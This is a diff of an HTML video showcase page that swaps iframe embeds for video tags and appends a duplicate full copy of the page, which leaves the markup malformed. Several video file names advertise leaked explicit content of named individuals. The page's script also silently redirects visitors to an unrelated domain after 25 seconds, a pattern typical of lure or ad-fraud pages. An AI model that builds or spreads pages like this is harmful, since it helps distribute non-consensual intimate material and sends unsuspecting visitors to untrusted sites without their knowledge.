@@ -49,7 +49,7 @@
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
         }
 
-        .video-wrapper iframe {
+        .video-wrapper video {
             width: 100%;
             height: 500px;
             display: block;
@@ -104,172 +104,150 @@
 </head>
 
 <body>
+    <!-- Video 1 -->
     <div class="container">
         <h1 class="title">Watch & Enjoy</h1>
         <div class="video-wrapper">
-            <iframe class="lazyload" data-src="OQWdvD0h_720p.mp4" frameborder="0" allowfullscreen></iframe>
+            <video id="video1" class="video" preload="metadata">
+                <source src="OQWdvD0h_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
         <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
+            <button onclick="togglePlay('video1', this)">Play/Pause</button>
         </div>
     </div>
 
+    <!-- Video 2 -->
     <div class="container">
         <h1 class="title">Another Video</h1>
         <div class="video-wrapper">
-            <iframe class="lazyload" data-src="R1agUmCi_720p.mp4" frameborder="0" allowfullscreen></iframe>
+            <video id="video2" class="video" preload="metadata">
+                <source src="R1agUmCi_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
         <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
+            <button onclick="togglePlay('video2', this)">Play/Pause</button>
         </div>
     </div>
 
+    <!-- Video 3 -->
     <div class="container">
         <h1 class="title">Enjoy This One</h1>
         <div class="video-wrapper">
-            <iframe class="lazyload" data-src="YHuhnrRf_720p.mp4" frameborder="0" allowfullscreen></iframe>
+            <video id="video3" class="video" preload="metadata">
+                <source src="YHuhnrRf_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
         <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
+            <button onclick="togglePlay('video3', this)">Play/Pause</button>
         </div>
     </div>
 
-    <div class="container">
-        <h1 class="title">Watch This</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="IdMiIY38_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Video Showcase</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="REPNrwlw_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Creative Clip</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="dVE9nRus_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Amazing Footage</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="hqaUpSTt_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Awesome Video</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="k4Yk1rR8_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Unique Clip</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="7p7JHkI4_720p.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Exclusive Video</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="Lara Rose Squirting(720P).mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">New Release</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="Lara Rose Gets Leaked NEW ONLYFANS(720P).mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Fresh Content</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="alex_mucci-20241210-0001.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Incredible Video</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="lv_0_20241119034905.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h1 class="title">Featured Clip</h1>
-        <div class="video-wrapper">
-            <iframe class="lazyload" data-src="lv_0_20241119041822.mp4" frameborder="0" allowfullscreen></iframe>
-        </div>
-        <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
-        </div>
-    </div>
-
+    <!-- Video 4 -->
     <div class="container">
         <h1 class="title">Must-See Video</h1>
         <div class="video-wrapper">
-            <iframe class="lazyload" data-src="moruhiko-20241209-0004.mp4" frameborder="0" allowfullscreen></iframe>
+            <video id="video4" class="video" preload="metadata">
+                <source src="IdMiIY38_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
         <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
+            <button onclick="togglePlay('video4', this)">Play/Pause</button>
         </div>
     </div>
 
+    <!-- Video 5 -->
     <div class="container">
-        <h1 class="title">Watch Now</h1>
+        <h1 class="title">New Arrival</h1>
         <div class="video-wrapper">
-            <iframe class="lazyload" data-src="01.mp4" frameborder="0" allowfullscreen></iframe>
+            <video id="video5" class="video" preload="metadata">
+                <source src="REPNrwlw_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
         <div class="controls">
-            <button onclick="togglePlay(this)">Play/Pause</button>
+            <button onclick="togglePlay('video5', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 6 -->
+    <div class="container">
+        <h1 class="title">Awesome Video</h1>
+        <div class="video-wrapper">
+            <video id="video6" class="video" preload="metadata">
+                <source src="dVE9nRus_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video6', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 7 -->
+    <div class="container">
+        <h1 class="title">Hot Video</h1>
+        <div class="video-wrapper">
+            <video id="video7" class="video" preload="metadata">
+                <source src="hqaUpSTt_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video7', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 8 -->
+    <div class="container">
+        <h1 class="title">Best Content</h1>
+        <div class="video-wrapper">
+            <video id="video8" class="video" preload="metadata">
+                <source src="k4Yk1rR8_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video8', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 9 -->
+    <div class="container">
+        <h1 class="title">Epic Video</h1>
+        <div class="video-wrapper">
+            <video id="video9" class="video" preload="metadata">
+                <source src="7p7JHkI4_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video9', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 10 -->
+    <div class="container">
+        <h1 class="title">Unseen Content</h1>
+        <div class="video-wrapper">
+            <video id="video10" class="video" preload="metadata">
+                <source src="Lara Rose Squirting(720P).mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video10', this)">Play/Pause</button>
         </div>
     </div>
 
     <script>
-        function togglePlay(button) {
-            var iframe = button.closest('.video-wrapper').querySelector('iframe');
-            var iframeDocument = iframe.contentWindow.document;
-            var video = iframeDocument.querySelector('video');
-
+        function togglePlay(videoId, button) {
+            var video = document.getElementById(videoId);
+            
             if (video.paused) {
                 video.play();
                 button.textContent = "Pause";
@@ -286,6 +264,277 @@
             window.location.href = redirectUrl;
         }, waitTime * 1000);
     </script>
+
+</body><!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Creative Video Showcase</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1d2671, #c33764);
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            position: relative;
+            text-align: center;
+            width: 90%;
+            max-width: 900px;
+            margin-top: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: scale(1.05);
+        }
+
+        .video-wrapper {
+            position: relative;
+            border: 5px solid rgba(255, 255, 255, 0.5);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .video-wrapper:hover {
+            transform: scale(1.05);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+        }
+
+        .video-wrapper video {
+            width: 100%;
+            height: 500px;
+            display: block;
+        }
+
+        .title {
+            margin: 20px 0;
+            font-size: 2.5rem;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.7);
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .controls {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+            gap: 15px;
+        }
+
+        .controls button {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .controls button:hover {
+            background: rgba(255, 255, 255, 0.5);
+            color: #333;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Video 1 -->
+    <div class="container">
+        <h1 class="title">Watch & Enjoy</h1>
+        <div class="video-wrapper">
+            <video id="video1" class="video" preload="metadata">
+                <source src="OQWdvD0h_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video1', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 2 -->
+    <div class="container">
+        <h1 class="title">Another Video</h1>
+        <div class="video-wrapper">
+            <video id="video2" class="video" preload="metadata">
+                <source src="R1agUmCi_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video2', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 3 -->
+    <div class="container">
+        <h1 class="title">Enjoy This One</h1>
+        <div class="video-wrapper">
+            <video id="video3" class="video" preload="metadata">
+                <source src="YHuhnrRf_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video3', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 4 -->
+    <div class="container">
+        <h1 class="title">Must-See Video</h1>
+        <div class="video-wrapper">
+            <video id="video4" class="video" preload="metadata">
+                <source src="IdMiIY38_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video4', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 5 -->
+    <div class="container">
+        <h1 class="title">New Arrival</h1>
+        <div class="video-wrapper">
+            <video id="video5" class="video" preload="metadata">
+                <source src="REPNrwlw_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video5', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 6 -->
+    <div class="container">
+        <h1 class="title">Awesome Video</h1>
+        <div class="video-wrapper">
+            <video id="video6" class="video" preload="metadata">
+                <source src="dVE9nRus_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video6', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 7 -->
+    <div class="container">
+        <h1 class="title">Hot Video</h1>
+        <div class="video-wrapper">
+            <video id="video7" class="video" preload="metadata">
+                <source src="hqaUpSTt_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video7', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 8 -->
+    <div class="container">
+        <h1 class="title">Best Content</h1>
+        <div class="video-wrapper">
+            <video id="video8" class="video" preload="metadata">
+                <source src="k4Yk1rR8_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video8', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 9 -->
+    <div class="container">
+        <h1 class="title">Epic Video</h1>
+        <div class="video-wrapper">
+            <video id="video9" class="video" preload="metadata">
+                <source src="7p7JHkI4_720p.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video9', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <!-- Video 10 -->
+    <div class="container">
+        <h1 class="title">Unseen Content</h1>
+        <div class="video-wrapper">
+            <video id="video10" class="video" preload="metadata">
+                <source src="Lara Rose Squirting(720P).mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="controls">
+            <button onclick="togglePlay('video10', this)">Play/Pause</button>
+        </div>
+    </div>
+
+    <script>
+        function togglePlay(videoId, button) {
+            var video = document.getElementById(videoId);
+            
+            if (video.paused) {
+                video.play();
+                button.textContent = "Pause";
+            } else {
+                video.pause();
+                button.textContent = "Play";
+            }
+        }
+
+        // Redirect after a specific time (25 seconds for example)
+        var waitTime = 25;
+        var redirectUrl = "https://luglawhaulsano.net/4/8456112"; // URL to redirect to
+        setTimeout(function() {
+            window.location.href = redirectUrl;
+        }, waitTime * 1000);
+    </script>
+
 </body>
+
+</html>
+
 
 </html>
